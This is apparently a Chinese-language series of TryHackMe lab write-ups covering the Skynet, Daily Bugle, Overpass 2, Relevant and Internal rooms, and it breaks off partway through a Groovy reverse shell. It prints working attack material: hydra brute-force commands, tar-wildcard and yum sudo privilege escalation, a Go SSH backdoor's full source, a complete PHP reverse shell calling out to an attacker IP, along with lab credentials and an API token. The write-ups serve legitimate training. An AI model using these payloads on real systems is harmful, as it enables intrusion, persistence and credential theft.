#攻击机所使用的连接至TryHackMe平台的内部vpn ip地址 set SSL false exploit /root/root.txt下 总结 针对web站点的登录框功能，采用了sql注入的万能密码，也是成功进入，之后针对其中的数据查询功能，采用SQLmap判断其中是否存在sql注入（post注入），最后dump出了用户名和密码，采用john工具解密出了密码，然后ssh远程登录。 随后ss -tulpn看到当前tcp套字连接情况，随后看到10000端口不出网，尝试ssh本地端口转发，使得我们可以从本地访问该端口，成功访问之后，采用用户名密码登录进去，发现存在webmin cms漏洞，接着就是常规msf exploit的利用。 0x08 Skynet挑战 nmap -T5 -sC -sV -p- 10.10.187.5 这里看到139与445端口的开放，尝试枚举一下smb看一下共享的文件有哪些（这里无密码即可） smbclient -L \\\\10.10.187.5 看到匿名用户anonymous文件夹，继续访问看一下该文件夹下存在什么 smbclient //10.10.187.5/anonymous 之后进入logs查看日志文件，发现log2.txt含有相关密码信息 cyborg007haloterminator terminator22596 terminator219 terminator20 terminator1989 terminator1988 terminator168 terminator16 terminator143 terminator13 terminator123!@# terminator1056 terminator101 terminator10 terminator02 terminator00 roboterminator pongterminator manasturcaluterminator exterminator95 exterminator200 dterminator djxterminator dexterminator determinator cyborg007haloterminator avsterminator alonsoterminator Walterminator 79terminator6 1996terminator 这里没思路了，看了wp是去找web站点的可疑点了，gobuster扫目录，发现squirrelmail可疑目录 这里是个邮件登录系统，可以联想到之前的邮件用户名，使用hydra爆破一下看看 hydra -l milesdyson -P log1.txt 10.10.187.5 http-form-post \"/squirrelmail/src/redirect.php:login_username=milesdyson&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:Unknown user or password incorrect\" 成功得到密码milesdyson:cyborg007haloterminator 登录进去之后看到了smb密码重置，里面是当前smb服务密码： )s{A&amp;2Z=F^n_E.B` 这里联想到登录前面的smb共享账户milesdyson 可以找到该账户notes备忘录中的信息，发现这里添加了个CMS，我们访问看看 尝试在二级目录下继续扫描敏感目录 dirsearch -u \"http://10.10.187.5/45kra24zxs28v3yd/\" 访问得到Cuppa CMS 漏洞库找到CMS漏洞， 发现存在远程文件包含，那直接包含我们构造的恶意shell文件（在我们的恶意服务器上） 如上图，成功拿到shell，这以后得提权就不是常规思路了，我想到了suid，但是没办法利用，结果wp先是搞了一个稳定shell，看的计划任务，但就算我看到计划任务，也不知道如何利用（虽然想到修改，但是在那个shell下无法正常使用vim） Tar通配符漏洞提权 which python #验证目标机有无Python环境 python -c \"import pty ; pty.spawn('/bin/bash')\" #利用Python环境将当前shell切换为一个更稳定的shell 这里看到backup.sh存在计划任务，我们看其中写的什么 -rwxr-xr-x 1 root root 74 Sep 17 2019 backup.sh 由上图可知以下信息： backups目录下有一个backup.sh文件，其内容和作用是–切换目录至/var/www/html 并将该目录下的所有内容归档为backup.tgz压缩文件，该tgz文件保存在backups目录下； 通过查看/etc/crontab即定时任务可知–刚才描述的backups目录下的backup.sh文件是一个定时任务，该.sh脚本每分钟都会以root身份执行。 在查询 GTFOBins 网站后，我们发现通过tar命令可以利用一个名为–checkpoint的参数，该参数允许在每次归档 X 个文件时（X的默认值为10）显示“进度”消息， –checkpoint还可以与 –checkpoint-action 标志串联使用，–checkpoint-action标志允许在到达检查点（checkpoint）时以二进制或脚本的形式执行某些操作。 结合前述已知信息：由于backups目录下的backup.sh脚本中使用的通配符* 将对 /var/www/html 目录中的所有文件和文件夹执行归档命令，因此我们可以通过在/var/www/html下添加 –checkpoint=1 文件（启用检查点功能）和 –checkpoint-action=exec=xxx 文件（指定要执行的操作，检查点值为1，每归档一个文件都执行指定操作），那么当 tar 处理到以上文件时，相关的文件名将会被有效地视为tar命令的参数–从而执行某些操作。 在/var/www/html目录下创建一个BASH脚本，该脚本的执行结果将创建一个实质为bash副本的 SUID 二进制文件，我们将该脚本命名为newroot.sh： echo \"cp /bin/bash /tmp/nroot &amp;&amp; chmod +s /tmp/nroot\" &gt; newroot.sh 继续在/var/www/html目录下执行命令创建以下两个文件，这两个文件的实际作用是以文件名作为 tar 命令行中的参数: touch \"/var/www/html/--checkpoint=1\" touch \"/var/www/html/--checkpoint-action=exec=sh newroot.sh\" 大约一分钟后，cron 计划作业（即backups目录下的backup.sh脚本）将会以root权限自动运行，从而能够成功创建一个SUID文件（/tmp/nroot），我们可以使用 -p 标志执行该SUID文件，这将允许以该文件的所有者身份（root）执行此二进制文件，进而可以根据此二进制文件的内容切换到root shell。 最后得到root flag 总结 依旧常规nmap扫描，发现110的pop3邮件服务协议以及SMB的139和445端口的开放，于是尝试枚举SMB服务，发现存在匿名用户和mile用户两个共享文件夹，先访问匿名的看是否存在敏感信息结果发现了一些密码列表，由于路子断了，可以想到看看web站点是否有漏洞，扫目录发现存在邮件系统登录页面，于是借用上述密码列表，成功爆破出强口令。 登录进去之后就是找信息或者漏洞点了，结果发现SMB服务重置之后的密码，于是可以成功登录SMB服务了，登录mile用户之后又发现一些信息泄露，发现存在一个CMS站点，继续扫二级目录找到后台登录地址，接着发现存在Cuppa CMS远程文件包含漏洞，于是包含shell文件，反弹得到shell，接着用自带的Python建立一个稳定shell，接着尝试提权，发现常规思路无果，看到计划任务可疑，发现存在tar通配符漏洞提权，凭借参数 配合使用最终拿到root priv 0x09 Daily Bugle 通过 SQLi 入侵 Joomla CMS 帐户，练习破解哈希值并利用 yum 提升您的权限。 初始访问 常规nmap扫描 nmap -T4 -sC -sV -p- 10.10.35.116 上图可以看到http-generator（这个可以说是识别当前web服务器指纹信息）写着joomla，那我们尝试搜一下相关利用 search joomla use scanner/http/joomla_version run 可以看到得到版本等详细信息，这里没想到去网络漫游，搜寻相关漏洞，根据提示去搜索的 一个是在exploit漏洞库可以看到利用方法：这个用的是sqlmap，且需要设置很多参数。 但如果继续搜索就会发现如下项目，其中包含众多CMS的利用脚本，我们直接采用这个 https://github.com/XiphosResearch/exploits SQL注入 如上图，这里是脚本用法，可以看到它需要你写出目标IP，并且会为你dump出用户和session表 python2 joomblah.py http://10.10.35.116/ 可以看到这里得到的表明，其中找到了一些用户名，这里我对于这个爆出来的数据理解错了，我以为user这里代表全都是用户名之类的，但当我看到wp的sqlmap结果，我悟了 这完全就是一个表结构而已，因此我们需要爆破后面的hash密码为明文即可（根据提示，使用john） john暴力破解 $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm//写到文件中即可 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 成功得到密码 继续网络漫游，搜寻获取后台之后如何getshell的思路，成功找到 上图位置，可以照着箭头找到，接着利用msf生成php shell，替换上述文件内容 msf获得shell 之后访问文件所在路径即可，同时msf开启监听（记得设置的payload类型一致） 拿到之后发现当前用户是apache，root和home的用户都无权访问，提权也找不到（这里我也是误区，以为提权必须找一些配置的错误，但wp告诉我，可以找相关配置文件，可能会泄露用户密码） 切换用户提权 如上图，这里的php文件，名字可疑，访问发现有数据库配置文件信息，其中包含密码，所以尝试该密码区切换用户之类的 su jjameson//输入密码即可 最后拿到flag，接下来看root sudo 提权 TF=$(mktemp -d) cat &gt;$TF/x&lt;&lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat &gt;$TF/y.conf&lt;&lt;EOF [main] enabled=1 EOF cat &gt;$TF/y.py&lt;&lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version='2.1' def init_hook(conduit): os.execl('/bin/sh','/bin/sh') EOF sudo yum -c $TF/x --enableplugin=y 可以看到成功提权 总结 这道题就是靠web站点层层深入，先是nmap扫描的时候，扫出了web站点相关指纹信息：joomla，直接网上找相关exploit 发现存在sql注入，利用相关脚本得到后台账户密码，登录进去，就是找相关功能RCE，幸运的是在设置模版文件的地方发现能自定义PHP文件内容，直接注入msf生成的php反向shell，访问运行，得到shell。之后就是提权，这里是sudo提权，但在使用这个前提是，在web相关配置文件找到了用户的密码信息，得以su 切换用户（因为在此之前是apache身份）之后sudo -l发现yum，找到yum的sudo提权方式，拿到root身份 参考文章 Daily Bugle --tryhackme.com Daily Bugle DAILY BUGLE – TRYHACKME WRITE-UP 0x10 Overpass 2 - Hacked 立交桥被黑了！你能分析攻击者的行为并入侵吗？ 取证-分析 PCAP 立交桥被黑了！SOC 团队（Paradox，恭喜晋升）在深夜值班时注意到可疑活动，同时查看 shibes，并设法在攻击发生时捕获数据包。你能弄清楚攻击者是如何进入的，并入侵Overpass的生产服务器吗？ 注意：虽然这个房间是一个演练，但它需要熟悉工具和 Linux。我建议至少学习基本的 Wireshark 并完成 Linux 基础知识。 PCAP 文件的 md5sum：11c3b2e9221865580295bc662c35c6dc 上图可以看到，上传文件的url为/development/，同时可以看到攻击者使用的payload 上图可以看到攻击者获取到了密码，下图可以看到攻击者建立持久性的方法 james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7::: paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7::: szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7::: bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7::: muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7::: 上面是攻击者获取的相关密码信息（转储影子文件所得），这里我们john爆破一下，发现有四个可以爆破出来 研究-分析代码 现在您已经找到了后门的代码，是时候分析它了。 github搜索即可，如下图可以看到默认密码和硬编码盐 package main import ( \"crypto/sha512\" \"fmt\" \"io\" \"io/ioutil\" \"log\" \"net\" \"os/exec\" \"github.com/creack/pty\" \"github.com/gliderlabs/ssh\" \"github.com/integrii/flaggy\" gossh \"golang.org/x/crypto/ssh\" \"golang.org/x/crypto/ssh/terminal\" ) var hash string = \"bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3\" func main() { var ( lport uint = 2222 lhost net.IP = net.ParseIP(\"0.0.0.0\") keyPath string = \"id_rsa\" fingerprint string = \"OpenSSH_8.2p1 Debian-4\" ) flaggy.UInt(&amp;lport, \"p\", \"port\", \"Local port to listen for SSH on\") flaggy.IP(&amp;lhost, \"i\", \"interface\", \"IP address for the interface to listen on\") flaggy.String(&amp;keyPath, \"k\", \"key\", \"Path to private key for SSH server\") flaggy.String(&amp;fingerprint, \"f\", \"fingerprint\", \"SSH Fingerprint, excluding the SSH-2.0- prefix\") flaggy.String(&amp;hash, \"a\", \"hash\", \"Hash for backdoor\") flaggy.Parse() log.SetPrefix(\"SSH - \") privKeyBytes, err := ioutil.ReadFile(keyPath) if err != nil { log.Panicln(\"Error reading privkey:\\t\", err.Error()) } privateKey, err := gossh.ParsePrivateKey(privKeyBytes) if err != nil { log.Panicln(\"Error parsing privkey:\\t\", err.Error()) } server := &amp;ssh.Server{ Addr: fmt.Sprintf(\"%s:%v\", lhost.String(), lport), Handler: sshterminal, Version: fingerprint, PasswordHandler: passwordHandler, } server.AddHostKey(privateKey) log.Println(\"Started SSH backdoor on\", server.Addr) log.Fatal(server.ListenAndServe()) } func verifyPass(hash, salt, password string) bool { resultHash := hashPassword(password, salt) return resultHash == hash } func hashPassword(password string, salt string) string { hash := sha512.Sum512([]byte(password + salt)) return fmt.Sprintf(\"%x\", hash) } func sshHandler(s ssh.Session) { command := s.RawCommand() if command != \"\" { s.Write(runCommand(command)) return } term := terminal.NewTerminal(s, \"$ \") for { command, _ = term.ReadLine() if command == \"exit\" { return } term.Write(runCommand(command)) } } func sshterminal(s ssh.Session) { cmd := exec.Command(\"/bin/bash\", \"-i\") ptyReq, _, isPty := s.Pty() if isPty { cmd.Env = append(cmd.Env, fmt.Sprintf(\"TERM=%s\", ptyReq.Term)) f, err := pty.Start(cmd) if err != nil { panic(err) } go func() { io.Copy(f, s) // stdin }() io.Copy(s, f) // stdout cmd.Wait() } else { io.WriteString(s, \"No PTY requested. \") s.Exit(1) } } func runCommand(cmd string) []byte { result := exec.Command(\"/bin/bash\", \"-c\", cmd) response, _ := result.CombinedOutput() return response } func passwordHandler(_ ssh.Context, password string) bool { return verifyPass(hash, \"1c362db832f3f864c8c2fe05f2002a05\", password) } 上图是攻击者使用的hash 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed 如上图，识别出该hash加密的可能算法，这里尝试sha512，对应的到 hashcat看一下对应的编号 显然根据上述go后门文件，这里是1710的格式 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 可以看到这里成功破解出盐：november16 攻击-重新进入 现在事件已经调查完毕，Paradox 需要有人再次控制 Overpass 生产服务器。包装盒上有标志，Overpass不能因为格式化服务器而失去！ ssh -oHostKeyAlgorithms=+ssh-rsa james@10.10.115.228 -p 2222 接下来就是提权，sudo -l没有结果，尝试suid，如下图，发现.suid_bash可疑文件 file命令查看，如下图：为一个64位的ELF可执行文件。 我们尝试执行，这里需要注意虽然该文件设置了suid权限，但需要你添加-p选项才可以以root身份运行，原因如下 总结 这篇文章，让我们学习的取证分析，得到流量包，在追踪TCP和HTTP流的过程，我们得知了攻击者是如何攻击该站点，并注入了后门。之后我们重新攻击的时候，直接利用该后门，ssh登录上去，身份为James，之后依旧是提权，sudo -l无果，尝试suid提权，找到一个二进制文件存在suid权限，执行的时候添加-p得到root身份。 参考文章 Writeup for TryHackMe Room ‘Overpass 2 - Hacked’ Forensics - Analyse the PCAP 0x11 Relevant 渗透测试要求 您已被分配到一个客户端，该客户端希望在 7 天内发布到生产环境中的环境上执行渗透测试。 Scope of Work 工作范围 客户要求工程师对提供的虚拟环境进行评估。客户要求提供有关评估的最少信息，希望从恶意行为者的角度进行参与（黑匣子渗透测试）。 客户端要求您保护两个标志（未提供位置）作为利用证明： User.txt Root.txt 此外，客户还提供了以下范围津贴： 此服务允许使用任何工具或技术，但我们要求您先尝试手动利用 查找并记录发现的所有漏洞 将发现的标志提交到仪表板 只有分配给计算机的 IP 地址在范围内 查找并报告所有漏洞（是的，有多个根路径） （角色扮演关闭） 我鼓励您将此挑战视为实际的渗透测试。考虑编写一份报告，包括执行摘要、漏洞和漏洞利用评估以及补救建议，因为这将有利于您准备 eLearnSecurity 认证专业渗透测试人员或该领域渗透测试人员的职业生涯。 注意 - 这个房间里没有任何东西需要Metasploit 计算机最多可能需要 5 分钟才能启动所有服务。 *此房间不接受书面记录。 常规扫描 nmap -T5 -p- 10.10.127.72 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 10:59 CST Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.52% done Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.97% done Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 46.66% done; ETC: 11:05 (0:03:15 remaining) Stats: 0:04:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 81.33% done; ETC: 11:05 (0:01:02 remaining) Nmap scan report for 10.10.127.72 Host is up (0.20s latency). Not shown: 65527 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 49663/tcp open unknown 49667/tcp open unknown 49669/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 324.81 seconds 可以看到139与445端口开启，尝试枚举SMB 接着连接目标nt4wrksv共享SMB服务 幸运的无密码即可访问，看到当前目录含有密码文件，下载查看 Bob - !P@$$W0rD!123 Bill - Juw4nnaM4n420696969!$$$ 接着对这些存活端口进行详细扫描 nmap -p 80,135,139,445,3389,49663,49667,49669 10.10.127.72 -sC -sV Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 11:38 CST Stats: 0:01:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 98.38% done; ETC: 11:39 (0:00:00 remaining) Nmap scan report for 10.10.127.72 Host is up (0.20s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-04-29T03:39:53+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=Relevant | Not valid before: 2024-04-28T02:58:49 |_Not valid after: 2024-10-28T02:58:49 | rdp-ntlm-info: | Target_Name: RELEVANT | NetBIOS_Domain_Name: RELEVANT | NetBIOS_Computer_Name: RELEVANT | DNS_Domain_Name: Relevant | DNS_Computer_Name: Relevant | Product_Version: 10.0.14393 |_ System_Time: 2024-04-29T03:39:14+00:00 49663/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2024-04-29T03:39:14 |_ start_date: 2024-04-29T02:59:08 | smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3) | Computer name: Relevant | NetBIOS computer name: RELEVANT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-04-28T20:39:18-07:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.66 seconds Web站点探测 尝试扫web站点目录，在49663端口下扫到了隐藏目录 感觉又是我想不到的思路，这里可以看到隐藏目录与我们SMB共享目录名称相同，我们访问看看 可以看到直接访问就能得到文件内容，说明这个用户的SMB共享托管到了web站点了，这里我看有的师傅是先尝试nmap继续扫描看是否存在一些脆弱的易受攻击的服务，也有的直接就知道可以上传反向shell。 SMB上传反向shell 这里我也先跟着师傅们走，等最后回过头来在思考，首先msf生成一个反向shell，由于这是IIS服务器，因此肯定是生成aspx文件 接着连接SMB共享，然后put上传shell，之后浏览器或者curl访问 dir /s /b c:\\ | find \"user.txt\" dir /s /b c:\\ | find \"root.txt\" #Windows命令行-- 按文件名查找相关路径 dir /s /b c:\\ | find \"user.txt\" #使用/b带有 DIR 命令的开关会去除所有多余的信息，仅显示当前目录中的文件夹和文件的名称，而不显示文件大小和时间戳等属性。 #或者直接输入 dir \\user.txt /s Windows令牌提权 接着就是windows提权，还是不熟悉。。。。不过这里知道是利用令牌窃取 由上图可知 当前用户似乎启用了 SeImpersonatePrivilege 令牌权限，这意味着我们可以使用令牌模拟来提升权限；接下来我们需要在目标机上执行一个漏洞利用程序–下载PrintSpoofer.exe，并将该exe文件上传到目标机（可以通过SMB服务上传文件）。 上传之后 dir /s /b c:\\ | find \"PrintSpoofer64.exe\" 找到exe所在位置，运行即可提权 PrintSpoofer64.exe -i -c cmd 总结 常规扫描之后，发现了139与445端口，尝试枚举SMB服务，发现四个共享文件，很可疑，接着扫描web站点目录，但没有结果，却发现四万多的端口也开启了IIS服务，接着尝试扫描该端口对应的目录，结果发现存在SMB共享目录。 接着发现SMB的共享目录允许上传文件（又因为能访问共享目录）会想到上传反向shell，之后访问拿到shell，接着就是Windows提权，whoami /priv发现某些特殊令牌开启了，直接github搜相关的利用工具，成功system权限。 给我的思考就是，在前期nmap扫的时候，就单纯的扫全端口即可，扫出来，在针对性的启用脚本扫描这些端口，可能会很快速。 接着扫目录也没必要陷入误区：非得扫web站点的目录（80端口）一定要都看看。还是得学会google，遇到相关关键问题，不会找办法利用，只能无脑看wp，这很可笑。 参考文章 TryHackMe: Relevant — Walkthrough Relevant — TryHackMe: Walkthrough Relevant- Try Hack Me 0x12 Internal 渗透测试任务 您已被分配给一位客户，该客户希望对三周后发布到生产环境的环境进行渗透测试。 Scope of Work 工作范围 客户请求工程师对所提供的虚拟环境进行外部、Web 应用程序和内部评估。客户要求提供有关评估的最少信息，希望从恶意行为者的角度进行参与（黑盒渗透测试）。客户要求您确保两个标志（未提供位置）作为利用证据： User.txt Root.txt 此外，客户还提供了以下范围津贴： 确保修改主机文件以反映internal.thm 本次合作允许使用任何工具或技术 找到并记录所有发现的漏洞 将发现的标志提交到仪表板 仅分配给您计算机的 IP 地址在范围内 （角色扮演关闭） 我鼓励您将这一挑战视为实际的渗透测试。考虑编写一份报告，其中包括执行摘要、漏洞和利用评估以及补救建议，因为这将有利于您为 eLearnsecurity eCPPT 或作为该领域渗透测试人员的职业生涯做准备。 注意 - 这个房间可以在没有 Metasploit 的情况下完成 常规扫描 nmap -T5 -p- 10.10.188.153 发现只开启了两个端口，先扫一下web站点 gobuster dir -u \"http://10.10.188.153/\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -t 50 wordpress渗透 发现是存在wordpress CMS，上wpscan进行进一步的扫描 wpscan --url http://10.10.188.153/wordpress/ 首先是简单扫描，发现wp版本：5.4.2，不过google了一番没找到利用的，想着wpscan能扫出啥，发现跟workthrough不一致，加不加token都扫不到这个wp的主题，但workthrough却可以，不理解 //扫描插件漏洞 wpscan --api-token WjvZf12T8mMWrRkopYBhoTCQ5tDZfdk0l0vxqNbEpwU --url http://10.10.188.153/wordpress/ -e vp //获取wp的用户名 wpscan --api-token WjvZf12T8mMWrRkopYBhoTCQ5tDZfdk0l0vxqNbEpwU --url http://internal.thm/wordpress/ -e u 至于这个wp的用户名，我们就可以信息搜集一手，可以找博客，或者直接在登陆页面，输入一些用户名，看页面回显是否一致，还有就是上述wpscan爆出的用户名 之后尝试利用wpscan爆破密码 wpscan --url http://10.10.188.153/wordpress/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt 密码：my2boys 建立shell 如下图找到主题编辑，可以看到能修改PHP文件，上传一个 php_reverse_shell.php即可 &lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP // Copyright (C) 2007 pentestmonkey@pentestmonkey.net // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. The author accepts no liability // for damage caused by this tool. If these terms are not acceptable to you, then // do not use this tool. // // In all other respects the GPL version 2 applies: // // This program is free software; you can redistribute it and/or modify // it under the terms of the GNU General Public License version 2 as // published by the Free Software Foundation. // // This program is distributed in the hope that it will be useful, // but WITHOUT ANY WARRANTY; without even the implied warranty of // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the // GNU General Public License for more details. // // You should have received a copy of the GNU General Public License along // with this program; if not, write to the Free Software Foundation, Inc., // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. If these terms are not acceptable to // you, then do not use this tool. // // You are encouraged to send comments, improvements or suggestions to // me at pentestmonkey@pentestmonkey.net // // Description // ----------- // This script will make an outbound TCP connection to a hardcoded IP and port. // The recipient will be given a shell running as the current user (apache normally). // // Limitations // ----------- // proc_open and stream_set_blocking require PHP version 4.3+, or 5+ // Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows. // Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available. // // Usage // ----- // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck. set_time_limit (0); $VERSION = \"1.0\"; $ip = '10.14.79.125'; // CHANGE THIS $port = 5555; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists('pcntl_fork')) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise. This is quite common and not fatal.\"); } // Change to a safe directory chdir(\"/\"); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } // Spawn shell process $descriptorspec = array( 0 =&gt; array(\"pipe\", \"r\"), // stdin is a pipe that the child will read from 1 =&gt; array(\"pipe\", \"w\"), // stdout is a pipe that the child will write to 2 =&gt; array(\"pipe\", \"w\") // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won't stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process's STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } // If we can read from the process's STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } // If we can read from the process's STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we've daemonised ourself // (I can't figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \"$string \"; } } ?&gt; 之后找到404.php文件所在路径，访问即可得到shell wp-content/themes/twentyseventeen/404.php 这里就最头疼了，想着靠自己努力努力，当前是www-data权限，所以需要提权，我一直认为有什么漏洞可以提权，但搞了半天找不到，我以为是提权姿势可能很骚，想不到还是要回归原始：信息搜集 密码泄露提权user walkthrough这里就是信息搜集，找到了opt目录下的敏感文件，查看发现用户泄露的密码。拿直接su 用户名切换即可 （为何是opt啊。。。） aubreanna:bubb13guM!@#123 同时发现本目录下这个文件，写着此时还在内网运行一个服务器 ssh端口转发拿下内网主机 curl -U aubreanna:bubb13guM!@#123 http://172.17.0.2:8080/ 由于我们不能访问其内网，因此需要ssh端口转发一下 ssh -f -N -L 4567:172.17.0.2:8080 aubreanna@internal.thm #根据前述结果，登录密码为：bubb13guM!@#123 #ssh端口转发(本地网卡地址0.0.0.0可省略)：HostB$ ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC #参数说明 #-C：压缩数据 #-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。 #-N ：不执行脚本或命令，通常与-f连用。 #-g ：在-L/-R/-D参数中，允许远程主机连接到建立转发的端口，如果不加这个参数，只允许本地主机建立连接。 #-L : 本地隧道，本地端口:目标IP:目标端口 #-D : 动态端口转发 #-R : 远程隧道 #-T ：不分配 TTY 只做代理用 #-q ：安静模式，不输出 错误/警告 信息 发现Jenkins组件，尝试爆破账户密码，猜测用户名就是admin hydra暴力破解 hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 4567 127.0.0.1 http-post-form \"/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid username or password\" 成功得到密码，接下来就是执行bash，不过尝试了很多，结果还是walkthrough有效？下去看看为何 好的，这是因为这个脚本控制台就提示了我们只能使用groovy script 发现google搜索即可得到 String host=\"10.14.79.125\"; int port=6666; String cmd=\"/bin/bash\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream 